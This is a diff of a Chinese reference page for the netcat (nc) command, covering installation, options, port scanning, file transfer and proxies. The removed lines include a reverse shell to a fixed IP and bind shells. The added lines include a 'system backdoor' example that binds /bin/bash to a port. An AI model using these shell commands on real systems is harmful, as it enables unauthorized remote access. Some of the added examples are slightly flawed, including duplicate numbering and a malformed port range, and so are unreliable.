@@ -1,123 +1,170 @@
 nc
 ===
 
-nc是网络工具中的瑞士军刀
+网络界的瑞士军刀，号称最强大的网络工具
 
 ## 补充说明
 
-**nc命令** 全称**netcat**，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 
-和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。
+nc命令全称netcat，是一款功能强大的网络工具，可以用来在网络上读、写和重定向数据。它可以打开TCP或UDP连接，发送或接收数据包，监听任意端口，进行端口扫描，支持IPv4和IPv6。它被称为网络界的瑞士军刀，因为它可以完成很多网络相关的任务，如聊天、文件传输、代理、后门、端口转发等。nc命令也可以用来编写脚本或其他程序调用的可靠的后端工具。
 
-###  语法
+## 适用的Linux版本
 
-```shell
-nc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>]
-[-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]
-```
+nc命令在大多数Linux发行版中都是默认可用的，或者可以通过包管理器安装。不过不同的发行版可能提供不同的版本或变体，如ncat、netcat、netcat-openbsd、netcat-traditional等。这些版本或变体可能有不同的选项或功能，所以在使用之前需要查看手册页或帮助信息来确定具体的用法。如果需要安装nc命令，可以根据不同的发行版使用不同的包管理器，如：
 
-###  选项
+- 在Debian/Ubuntu上，可以使用apt-get命令安装netcat-openbsd或netcat-traditional包：
 
 ```shell
--4 只使用IPV4
--6 只使用IPV6
--c 使用tls连接或者监听
--D 启用socket调试开关
--g <网关> # 设置路由器跃程通信网关，最多可设置8个。
--G<指向器数目> # 设置来源路由指向器，其数值为4的倍数。
--h 在线帮助。
--i<延迟秒数> 设置时间间隔，以便传送信息及扫描通信端口。
--l 使用监听模式，管控传入的资料。
--n 直接使用IP地址，而不通过域名服务器。
--o<输出文件> # 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
--p<通信端口> # 设置本地主机使用的通信端口。
--r 乱数指定本地与远端主机的通信端口。
--s<来源位址> # 设置本地主机送出数据包的IP地址。
--u 使用UDP传输协议。
--v 显示指令执行过程。
--w<超时秒数> # 设置等待连线的时间。
--z 使用0输入/输出模式，只在扫描通信端口时使用。
+# 安装netcat-openbsd
+sudo apt-get install netcat-openbsd
+
+# 安装netcat-traditional
+sudo apt-get install netcat-traditional
 ```
 
-### 实例
-
-**TCP端口扫描**
+- 在CentOS/RHEL上，可以使用yum或dnf命令安装nmap-ncat包：
 
 ```shell
-[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 
-192.168.0.3: inverse host lookup failed: Unknown host
-(UNKNOWN) [192.168.0.3] 80 (http) open
-(UNKNOWN) [192.168.0.3] 23 (telnet) open
-(UNKNOWN) [192.168.0.3] 22 (ssh) open
+# 使用yum命令
+sudo yum install nmap-ncat
+
+# 使用dnf命令（CentOS 8/RHEL 8）
+sudo dnf install nmap-ncat
 ```
 
-扫描192.168.0.3 的端口 范围是 1-100
-**扫描UDP端口**
+- 在Fedora上，可以使用dnf命令安装nmap-ncat或netcat包：
 
 ```shell
-[root@localhost ~]# nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000
+# 安装nmap-ncat
+sudo dnf install nmap-ncat
+
+# 安装netcat
+sudo dnf install netcat
 ```
 
-**扫描指定端口**
+- 在Arch Linux上，可以使用pacman命令安装gnu-netcat或openbsd-netcat包：
 
 ```shell
-[root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口
-(UNKNOWN) [192.168.0.1] 80 (?) open
-y  //用户输入
+# 安装gnu-netcat
+sudo pacman -S gnu-netcat
+
+# 安装openbsd-netcat
+sudo pacman -S openbsd-netcat
 ```
 
-查看从服务器到目的地的出站端口 443 是否被防火墙阻止
+## 命令语法
 
+```
+nc [options] hostname port [port] ...
+```
+
+* options是指定一些选项来控制nc命令的行为
+* hostname是指定要连接或监听的主机名或IP地址
+* port是指定要连接或监听的端口号，可以是一个范围。
+
+## 选项
+
+| 选项 | 说明                                       |
+| ---- | ------------------------------------------ |
+| -4   | 强制使用IPv4                               |
+| -6   | 强制使用IPv6                               |
+| -c   | 执行指定的shell命令，并将其输出发送到网络  |
+| -e   | 将指定的程序与网络连接关联                 |
+| -g   | 设置路由器跃程通信网关（最多8个）          |
+| -G   | 设置来源路由指针（必须是4的倍数）          |
+| -h   | 显示帮助信息                               |
+| -i   | 设置时间间隔（秒），用于发送数据和扫描端口 |
+| -k   | 保持监听状态，并接受多个连接               |
+| -l   | 使用监听模式，等待传入连接                 |
+| -n   | 不进行域名解析                             |
+| -o   | 将传输数据以16进制格式保存到指定文件       |
+| -p   | 指定本地端口号                             |
+| -r   | 随机选择本地和远程端口号                   |
+| -s   | 指定本地IP地址                             |
+| -u   | 使用UDP协议                                |
+| -v   | 显示详细信息                               |
+| -w   | 设置超时时间（秒）                         |
+| -z   | 使用零输入/输出模式，仅用于扫描端口        |
+
+## 示例
+
+### 1、端口扫描（常用）
 ```shell
-nc -vz acme-v02.api.letsencrypt.org 443 -w2
-# Ncat: Version 7.50 ( https://nmap.org/ncat )
-# Ncat: Connected to 23.77.214.183:443.
-# Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.
-```
-**文件传输**
+# 扫描单个端口，-v显示详细过程，-w 10表示等待超时最大时长为10s，-z表示使用端口扫描模式
+$ nc -v -w 10 -z 127.0.0.1 7891
+Connection to 127.0.0.1 7891 port [tcp/*] succeeded!
 
+# 范围扫描，扫描1到1000的端口
+$ nc -v -w 10 -z 127.0.0.1 1—1000
+```
+
+### 2、监听端口
 ```shell
-# 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：
-nc -lp 8888 > node.tar.gz
+# 监听tcp端口
+$ nc -l 8080
 
-# 传输方发文件：
-nc -nv 192.168.75.121 8888  < node_exporter-1.3.1.linux-amd64.tar.gz
-# ⚠️ 注意：192.168.75.121是接收方的ip地址。
+# 监听udp端口
+$ nc -l -u 1234
 ```
 
+### 3、连接远程系统
 ```shell
-# 如果希望文件传输结束后自动退出，可以使用下面的命令：
-nc -lp 8888 > node.tar.gz
-nc -nv 192.168.75.121 8888 -i 1 < node_exporter-1.3.1.linux-amd64.tar.gz
-# ⚠️ 注意：-i 表示闲置超时时间
+# 连接远程系统
+$ nc 192.168.1.100 80
+
+# 测试某个远程主机 UDP 端口的连通性
+$ nc -v -u 192.168.1.100 80
 ```
 
-**远程控制**
-
+### 4、聊天系统
 ```shell
-# 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。
-# 被控制端执行下面的命令：
-nc -lvnp 8888 -c bash
-# 控制端执行下面的命令：
-nc 192.168.75.121 8888
-```
+# HOST1运行
+$ nc -l 8080
 
+# HOST2运行
+$ nc HOST1 8080
+```
+之后开始发送消息，这些消息会在服务器终端上显示出来。
+
+### 5、发送文件
 ```shell
-# 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。
-# 控制端执行下面的命令：
-nc -lvnp 8888
-# 被控制端执行下面的命令：
-nc 192.168.75.121 8888 -c bash
+# 从 HOST1（Client） 发送文件到 HOST2（Server） 的 TCP 9899 端口
+# HOST2：
+$ nc -l 9899 > outputfile
+
+# HOST1：
+$ nc HOST2 9899 < inputfile
 ```
 
-**反弹shell**
-
+### 6、创建系统后门
 ```shell
-# 控制端执行下面的命令：
-nc -lvnp 8888
+# HOST1上执行
+$ nc -l 10000 -e /bin/bash
+
+# HOST2上执行
+$ nc HOST1 10000
+```
+这样可以在HOST2上通过HOST1的10000端口，通过bash获取我们系统的完整访问权限，常用于黑客后门攻击。
+
+### 6、端口转发
+```shell
+# 所有连接到 80 端口的连接都会转发到 8080 端口
+$ nc -u -l  80 -c  'ncat -u -l 8080'
 ```
 
-```
-# 被控端执行下面的命令:
-bash -i &> /dev/tcp/192.168.75.121/8888 0>&1
+### 7、创建代理服务器
+```shell
+# 在本机 8888 端口创建 HTTP 代理
+$ nc -l --proxy-type http localhost 8888 --proxy-auth username:password
+
+# 测试 HTTP 代理服务器（支持隧道模式）
+$ curl -x 'http://username:password@localhost:8888' httpbin.org/anything
 ```
 
+### 8、通过代理服务器连接
+```shell
+# 通过 SOCKS5 1080 端口，连接 smtphost:25
+$ nc --proxy socks5host --proxy-type socks5 --proxy-auth proxyusername:password smtphost 25
+
+# SSH 通过 Ncat 指定代理，通过代理访问
+$ ssh -o ProxyCommand="ncat --proxy-type http/socks4/socks5 --proxy proxy.net:端口 %h %p" user@server.net
+```
